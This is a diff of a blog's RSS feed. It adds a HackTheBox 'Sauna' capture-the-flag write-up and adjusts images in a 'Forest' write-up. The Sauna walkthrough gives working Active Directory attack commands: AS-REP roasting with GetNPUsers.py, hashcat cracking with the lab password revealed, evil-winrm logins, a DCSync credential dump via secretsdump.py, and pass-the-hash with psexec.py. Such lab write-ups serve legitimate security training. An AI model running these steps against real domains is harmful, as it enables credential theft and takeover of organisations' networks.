@@ -5,7 +5,254 @@
     <link>https://fahmifj.github.io/tags/kerberos/</link>
     <description>Recent content in Kerberos on Ef&#39;s log</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Sat, 03 Apr 2021 13:51:48 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/kerberos/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 07 Apr 2021 12:02:54 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/kerberos/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Sauna</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-sauna/</link>
+      <pubDate>Wed, 07 Apr 2021 12:02:54 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-sauna/</guid>
+      <description>Learn basics exploitation of Active Directory</description>
+      <content:encoded><![CDATA[<p>Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on registry, and a DCSync attack to pull Active Directory password hashes.</p>
+<p>Sauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack and obtain the Kerberos TGT from one of the users. The TGT can be cracked to obtain the user&rsquo;s password. With the obtained password, I&rsquo;m able to gain a foothold on the machine. Internal enumeration finds AutoLogon credentials from the registry. BloodHound discovers these credentials can be leveraged to perform a DCSync attack and obtain all of the NTLM hashes from the Active Directory database. Armed with the administrator hash, I&rsquo;m able to gain an interactive shell access as NT Authority\System.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Generating potential usernames</li>
+<li>AS-Rep roasting</li>
+<li>BloodHound</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
+<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Port scanning is the first thing I&rsquo;d do.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ nmap -sV -sC -oA nmap/sauna <span style="color:#e6db74">&#39;10.10.10.175&#39;</span>
+... &lt;snip&gt; ...
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Egotistical Bank :: Home
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020-04-22 00:45:32Z<span style="color:#f92672">)</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+3269/tcp open  tcpwrapped
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>4/21%Time<span style="color:#f92672">=</span>5E9F315E%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSV
+SF:ersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+</span><span style="color:#e6db74">SF:x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
+Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 6h59m28s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-04-22T00:47:55
+|_  start_date: N/A
+... &lt;snip&gt; ...
+</code></pre></div><p>Based on the result above, Sauna is an Active Directory domain controller (DC) bundled with the IIS web server.</p>
+<p><code>nmap</code> also identified Sauna&rsquo;s domain name as <code>EGOTISTICAL-BANK.LOCAL</code>.</p>
+<blockquote>
+<p>Active Directory domain is similar to web domain both in concept and usage, but the realm is different.  Active Directory domain is intended for internal/private networks only (e.g. between branch offices), so it is restricted to the outside world.</p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<h4 id="web-pages-overview">Web Pages Overview</h4>
+<p>These are some overview of the web pages.</p>
+<p><img class="img-container" src="imgs/image-20210407123719988.png" alt="image-20210407123719988"  />
+</p>
+<p><img class="img-container" src="imgs/image-20210407123908202.png" alt="image-20210407123908202"  />
+</p>
+<p><img class="img-container" src="imgs/image-20210407123842325.png" alt="image-20210407123842325"  />
+</p>
+<p><img class="img-container" src="imgs/image-20210407123656847.png" alt="image-20210407123656847"  />
+</p>
+<p>The input vectors doesn&rsquo;t seem injectable.</p>
+<h4 id="generating-usernames">Generating Usernames</h4>
+<p>These are the hints given by the author:</p>
+<p>The first one is the word &ldquo;roast&rdquo; on the homepage and the contact page. This might refer to the AS-REP roasting attack.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">I got a loan and can&#39;t pay it back, I cant even get a ticket to roast my chestnuts!
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">We will always try to never answer your quetsions - we&#39;re too busy roasting in the sauna, counting our money
+</code></pre></div><p>The second one is the word &ldquo;only one&rdquo;, this can be interpreted as only one of the users is vulnerable.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Meet the team. So many bank account managers but only one security manager. Sounds about right!
+</code></pre></div><p>From here, I manually collected the team names from the site and created a script to generate usernames based on their first and last names.</p>
+<blockquote>
+<p>Based on common/best practices of <a href="imgs/active-directory-user-naming-convention">AD user naming conventions</a></p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python3</span>
+<span style="color:#f92672">import</span> sys
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">convert_name</span>(userfile):
+        f <span style="color:#f92672">=</span> open(userfile, <span style="color:#e6db74">&#39;r&#39;</span>)
+        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> f<span style="color:#f92672">.</span>readlines():
+                data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>))
+                names <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
+                first_letter <span style="color:#f92672">=</span> names[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">0</span>]
+                first_name <span style="color:#f92672">=</span> names[<span style="color:#ae81ff">0</span>]
+                lastname <span style="color:#f92672">=</span> names[<span style="color:#ae81ff">1</span>]
+                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>first_name<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>lastname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>first_letter<span style="color:#e6db74">}{</span>lastname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>first_letter<span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">{</span>lastname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>first_letter<span style="color:#e6db74">}</span><span style="color:#e6db74">a</span><span style="color:#e6db74">{</span>lastname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>first_letter<span style="color:#e6db74">}</span><span style="color:#e6db74">e</span><span style="color:#e6db74">{</span>lastname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span> :
+        <span style="color:#66d9ef">try</span>:
+                namelist <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>strip()
+        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IndexError</span>:
+                print(<span style="color:#e6db74">&#34;[-] Usage: ./convert-name.py listnames&#34;</span>)
+                exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)
+
+        convert_name(namelist)
+</code></pre></div><p>Below are the generated usernames from the script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ python convert-name.py listnames
+Fergus.Smith
+FSmith
+F.Smith
+FaSmith
+FeSmith
+Shaun.Coins
+SCoins
+S.Coins
+SaCoins
+SeCoins
+Hugo.Bear
+HBear
+H.Bear
+HaBear
+HeBear
+Steven.Kerb
+SKerb
+S.Kerb
+SaKerb
+SeKerb
+Bowie.Taylor
+BTaylor
+B.Taylor
+BaTaylor
+BeTaylor
+Sophie.Driver
+SDriver
+S.Driver
+SaDriver
+SeDriver
+</code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-fsmith">Shell as Fsmith</h3>
+<h4 id="as-rep-roasting">AS-REP Roasting</h4>
+<blockquote>
+<p>On <a href="https://fahmifj.github.io/writeup/htb-forest/">Forest Write-up</a>, I briefly explained about AS-REP Roasting.</p>
+</blockquote>
+<p>With the generated usernames, AS-REP roasting attack can be performed using <code>GetNPUsers.py</code> from Impacket.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ GetNPUsers.py -dc-ip <span style="color:#e6db74">&#39;10.10.10.175&#39;</span> -request EGOTISTICAL-BANK.LOCAL/ -usersfile ADUser.txt -format hashcat -output ADuserTGT.txt
+</code></pre></div><p>It successfully obtained <code>FSmith</code>&rsquo;s TGT.</p>
+<p><img class="img-container" src="imgs/image-20210407143301639.png" alt="image-20210407143301639"  />
+</p>
+<h4 id="cracking-tgt">Cracking TGT</h4>
+<p><code>hashcat</code> successfully cracked the TGT (performed on my Windows machine).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">C:<span style="color:#ae81ff">\t</span>ools<span style="color:#ae81ff">\h</span>ashcat6&gt;hashcat.exe -m <span style="color:#ae81ff">18200</span> <span style="color:#e6db74">&#39;$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc&#39;</span> C:/tools/rockyou.txt
+
+... &lt;snip&gt; ...
+$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc:Thestrokes23
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Hash.Target......: $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd...0bffcc
+... &lt;snip&gt; ...
+</code></pre></div><p>The password is <code>Thestrokes23</code>.</p>
+<h4 id="remote-access">Remote Access</h4>
+<p>This user can login remotely with <code>evil-winrm</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ evil-winrm -i <span style="color:#e6db74">&#39;10.10.10.175&#39;</span> -u fsmith -p <span style="color:#e6db74">&#39;Thestrokes23&#39;</span> 
+</code></pre></div><p>User flag is done here.</p>
+<center>
+<p><img class="img-container" src="imgs/image-20210407143917902.png" alt="image-20210407143917902"  />
+</p>
+</center>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-svc_loanmgr">Shell as svc_loanmgr</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>WinPEAS discovered that <code>svc_loanmanager</code> has an autologon credential.</p>
+<center>
+<p><img class="img-container" src="imgs/image-20210407132849744.png" alt="image-20210407132849744"  />
+</p>
+</center>
+<p>But based on <code>rpcclient</code>, it&rsquo;s actually <code>svc_loanmgr</code>.</p>
+<center>
+<p><img class="img-container" src="imgs/image-20210408043941867.png" alt="image-20210408043941867"  />
+</p>
+</center> 
+<p>This account also can login remotely.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ evil-winrm -i <span style="color:#e6db74">&#39;10.10.10.175&#39;</span> -u svc_loanmgr -p <span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span>
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>vc_loanmgr<span style="color:#ae81ff">\D</span>ocuments&gt;
+</code></pre></div><h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
+<h4 id="enumeration-with-bloodhound">Enumeration with BloodHound</h4>
+<p>I ran the second WinPEAS scan, but found nothing particularly interesting (this was prior to zerologon). Since this is an AD environment, I can try BloodHound.</p>
+<p>I copied <code>SharpHound.exe</code> (the ingestor) to Sauna using <code>evilwin-rm</code> and ran it to start collecting data.</p>
+<blockquote>
+<p><code>evilwin-rm</code> has capability to transfer files directly between my machine and the remote (Sauna). The keywords are <code>download</code> and <code>upload</code>.</p>
+</blockquote>
+<center>
+<p><img class="img-container" src="imgs/image-20210407133118769.png" alt="image-20210407133118769"  />
+</p>
+</center>
+<p>It finished within a few seconds.</p>
+<p>I copied the collected data to my machine and loaded it to <code>BloodHound</code> with drag and drop.</p>
+<center>
+<p><img class="img-container" src="imgs/image-20210407133124208.png" alt="image-20210407133124208"  />
+</p>
+</center>
+<p>After trying a few of <code>BloodHound</code>&rsquo;s prebuilt queries, <code>BloodHound</code> reveals that <code>svc_loanmgr</code> has <code>GetChangesAll</code> and <code>GetChanges</code> permissions on the domain.</p>
+<p><img class="img-container" src="imgs/image-20210407133140640.png" alt="image-20210407133140640"  />
+</p>
+<p>I can access the help section by right clicking the edge. So, <code>GetChanges</code> and <code>GetChangesAll</code> are in conjunction with <code>DS-Replication-Get-Changes-All</code>. This grants <code>svc_loanmgr</code> ability to perform the DCSync attack.</p>
+<p><img class="img-container" src="imgs/image-20210407133147048.png" alt="image-20210407133147048"  />
+</p>
+<p>The &ldquo;Abuse Info&rdquo; section contains how to abuse these privileges using <code>mimikatz</code></p>
+<p><img class="img-container" src="imgs/image-20210407133150811.png" alt="image-20210407133150811"  />
+</p>
+<h4 id="credential-dumping">Credential Dumping</h4>
+<p>Since Windows Defender typically doesn&rsquo;t get along with <code>mimikatz</code>, I use <code>secretsdump.py</code> to perform a DCSync attack just like I did on Forest.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:<span style="color:#e6db74">&#39;Moneymakestheworldgoround!&#39;</span>@10.10.10.175 -just-dc-ntlm
+</code></pre></div><p><img class="img-container" src="imgs/image-20210407133219251.png" alt="image-20210407133219251"  />
+</p>
+<h4 id="pass-the-hash---psexecpy">Pass the hash - psexec.py</h4>
+<p>Now I can use <code>psexec.py</code> to perform pass-the-hash using administrator hash to gain shell access as local system.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «sauna» «192.168.2.103»
+$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@htb.sauna
+</code></pre></div><p><img class="img-container" src="imgs/image-20210407133250451.png" alt="image-20210407133250451"  />
+</p>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HackTheBox - Forest</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-forest/</link>
@@ -117,7 +364,7 @@ user:<span style="color:#f92672">[</span>santi<span style="color:#f92672">]</spa
 </blockquote>
 <p>Below is the overview of the Kerberos mechanism. The AS-REP roasting process is indicated by the red circle (or oval I guess?).</p>
 <center>
-<p><div class="img-container"><img src="imgs/55e839a7e034457a922add499992970d.png" alt="1c8adf13109de9cc575c53d4eb659467.png"  /></div>
+<p><img class="img-container" src="imgs/55e839a7e034457a922add499992970d.png" alt="1c8adf13109de9cc575c53d4eb659467.png"  />
 </p>
 <p><small>Taken from &ldquo;Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System&rdquo; by David Freimanis</small></p>
 </center>
@@ -135,7 +382,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7$ea7045cfe9
 </code></pre></div><h4 id="cracking-tgt">Cracking TGT</h4>
 <p>The obtained TGT can be cracked  with dictionary attack using <code>hashcat</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ hashcat64.exe -m <span style="color:#ae81ff">18200</span> svcalfresco.txt rockyou.txt -O
-</code></pre></div><p><div class="img-container"><img src="imgs/54b3a7dbe1c644a98c00a8458e2723ff.png" alt="3fa7dc6810434503007549f8610016fa.png"  /></div>
+</code></pre></div><p><img class="img-container" src="imgs/54b3a7dbe1c644a98c00a8458e2723ff.png" alt="3fa7dc6810434503007549f8610016fa.png"  />
 </p>
 <p>The password is <code>s3rvice</code>.</p>
 <h4 id="remote-login---evil-winrm">Remote login - Evil-WinRM</h4>
@@ -144,7 +391,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7$ea7045cfe9
 $ evil-winrm -i <span style="color:#e6db74">&#39;10.10.10.161&#39;</span> -u svc-alfresco -p s3rvice
 </code></pre></div><p>User flag is done here.</p>
 <center>
-<p><div class="img-container"><img src="imgs/image-20210405164859538.png" alt="image-20210405164859538"  /></div>
+<p><img class="img-container" src="imgs/image-20210405164859538.png" alt="image-20210405164859538"  />
 </p>
 </center>
 <h2 id="privilege-escalation">Privilege Escalation</h2>
@@ -161,12 +408,12 @@ $ smbserver.py myfj . -smb2support -username iamf -password iamf
 *Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> cd mikun:
 </code></pre></div><p>I&rsquo;ve already copied <code>SharpHound.exe</code>, the BloodHound ingestor, to my share.</p>
 <center>
-<p><div class="img-container"><img src="imgs/80def241b823454fa383ea4c1caabc48.png" alt="4da2b821c626eeaa85eecea39b4c96d7.png"  /></div>
+<p><img class="img-container" src="imgs/80def241b823454fa383ea4c1caabc48.png" alt="4da2b821c626eeaa85eecea39b4c96d7.png"  />
 </p>
 </center>
 <p>I’ll start data collecting with <code>-c all</code> option to collect all.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS mikun:<span style="color:#ae81ff">\&gt;</span> .<span style="color:#ae81ff">\S</span>harpHound.exe -c all
-</code></pre></div><p><div class="img-container"><img src="imgs/acfc9f4b0e234e03824e901be6c9bae0.png" alt="79cb63de9a27f691e28d80820db1ad3d.png"  /></div>
+</code></pre></div><p><img class="img-container" src="imgs/acfc9f4b0e234e03824e901be6c9bae0.png" alt="79cb63de9a27f691e28d80820db1ad3d.png"  />
 </p>
 <p>After it finishes, I’ll fire up BloodHound GUI and then load the collected data by drag and drop.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@iamf «forest» «10.10.14.116»
@@ -174,7 +421,7 @@ $ neo4j console &amp;
 → root@iamf «forest» «10.10.14.116»
 $ bloodhound --no-sandbox &amp;
 </code></pre></div><p>I marked <code>svc-alfresco</code> as ‘owned’ then used BloodHound pre-built analytics queries to find the shortest path from <code>svc-alfresco</code> to domain admin. The prebuilt query name is “Shortest Path from Owned Principal”.</p>
-<p><div class="img-container"><img src="imgs/2506f5fa02894bd2b3d1095de0c87dcb.png" alt="210d3c3d6e83c6abadd56212b588b7b0.png"  /></div>
+<p><img class="img-container" src="imgs/2506f5fa02894bd2b3d1095de0c87dcb.png" alt="210d3c3d6e83c6abadd56212b588b7b0.png"  />
 </p>
 <p>Path explanation, from top (nearest path to domain admin) to the bottom:</p>
 <ul>
@@ -225,7 +472,7 @@ htb.local<span style="color:#ae81ff">\s</span>anti:1152:aad3b435b51404eeaad3b435
 <p>Administrator hash can be used with <code>psexec.py</code> from Impacket to gain shell access (pass-the-hash).</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.116»
 $ psexec.py -hashes <span style="color:#e6db74">&#39;aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6&#39;</span> administrator@10.10.10.161
-</code></pre></div><p><div class="img-container"><img src="imgs/5a2108e444d24cdaa30025943db72b72.png" alt="f5aa475536c65192d37a0278a77646ee.png"  /></div>
+</code></pre></div><p><img class="img-container" src="imgs/5a2108e444d24cdaa30025943db72b72.png" alt="f5aa475536c65192d37a0278a77646ee.png"  />
 </p>
 <hr>
 <h2 id="references">References</h2>
